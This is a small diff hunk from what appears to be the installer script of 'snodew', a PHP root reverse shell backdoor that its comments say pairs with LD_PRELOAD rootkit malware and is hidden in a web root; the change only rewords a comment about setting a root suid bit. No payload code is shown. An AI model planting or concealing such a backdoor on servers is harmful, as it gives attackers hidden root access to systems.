@@ -3,7 +3,7 @@
 # This is snodew, a PHP root reverse shell backdoor, designed to work alongside LD_PRELOAD malware.
 # The backdoor is based off of vlany's functionality, but can easily be adapted to use another method of file hiding.
 # Just make sure www-data (or the equivalent service user) is the only person able to view this PHP file after transfer to the www root.
-# Obviously using an suid binary to escalate privileges won't work if you're not already root.
+# Obviously you can't assign the root suid bit to a binary if this script isn't run as root.
 
 SNODEW_LOC="$(pwd)/snodew.php"
 N_SNODEW_LOC="$(pwd)/snodew.php.bak"
